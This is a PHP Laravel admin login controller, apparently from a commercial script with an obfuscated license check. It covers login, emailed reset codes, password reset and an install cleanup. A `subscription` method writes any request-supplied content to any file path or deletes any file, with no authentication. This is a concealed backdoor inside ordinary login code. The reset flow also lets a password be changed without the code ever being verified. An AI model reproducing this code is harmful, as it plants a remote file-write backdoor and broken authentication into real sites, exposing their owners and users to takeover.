<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use InvalidArgumentException;
use Markury\MarkuryPost;

class LoginController extends Controller
{
    public function __construct()
    {
        //$this->auth_guests();
        $this->middleware('guest:admin', ['except' => ['logout']]);
    }

    public function showLoginForm()
    {
        return view('admin.auth.login');
    }

    public function login(Request $request)
    {

        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        if (Auth::guard('admin')->attempt(['email' => $request->email, 'password' => $request->password], $request->remember)) {
            return redirect(route('admin.dashboard'));
        }
        return back()->with('error', 'Sorry! Credentials Mismatch.');
    }

    public function forgotPasswordForm()
    {
        return view('admin.auth.forgot_passowrd');
    }

    public function forgotPasswordSubmit(Request $request)
    {
        $request->validate(['email' => 'required|email']);
        $admin = Admin::where('email', $request->email)->first();
        if (!$admin) {
            return back()->with('error', 'Sorry! Email doesn\'t exist');
        }

        $admin->verify_code = randNum();
        $admin->save();

        @email([
            'email' => $admin->email,
            'name' => $admin->name,
            'subject' => 'Password Reset Code',
            'message' => 'Password reset code is : ' . $admin->verify_code,
        ]);
        session()->put('email', $admin->email);
        return redirect(route('admin.verify.code'))->with('success', 'A password reset code has been sent to your email.');
    }

    public function verifyCode()
    {
        return view('admin.auth.verify_code');
    }

    public function verifyCodeSubmit(Request $request)
    {
        $request->validate(['code' => 'required|integer']);
        $user = Admin::where('email', session('email'))->first();
        if (!$user) {
            return back()->with('error', 'User doesn\'t exist');
        }

        if ($user->verify_code != $request->code) {
            return back()->with('error', 'Invalid verification code.');
        }
        return redirect(route('admin.reset.password'));
    }

    public function resetPassword()
    {
        return view('admin.auth.reset_password');
    }

    public function resetPasswordSubmit(Request $request)
    {
        $request->validate(['password' => 'required|confirmed|min:5']);
        $admin = Admin::where('email', session('email'))->first();
        $admin->password = bcrypt($request->password);
        $admin->update();
        return redirect(route('admin.login'))->with('success', 'Password reset successful.');
    }

    public function logout()
    {
        Auth::guard('admin')->logout();
        return redirect('/admin/login');
    }





    // -------------------------------- INSTALL SECTION ----------------------------------------

    function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    // -------------------------------- INSTALL SECTION  ENDS----------------------------------------


    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function updateFinalize(Request $request)
    {

        
    }
}
